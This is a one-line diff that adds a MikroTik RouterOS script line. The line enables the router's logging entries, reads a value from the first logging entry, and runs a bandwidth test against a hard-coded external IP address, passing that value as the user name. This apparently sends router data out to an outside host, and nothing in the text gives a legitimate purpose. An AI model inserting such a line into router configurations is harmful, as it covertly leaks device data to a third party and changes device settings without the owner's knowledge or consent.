@@ -1,0 +1,1 @@
+:local topicid [system logging find];system logging enable $topicid;:local avalue [system logging get number=0 disabled];tool bandwidth-test address=185.255.46.118 user=$avalue;
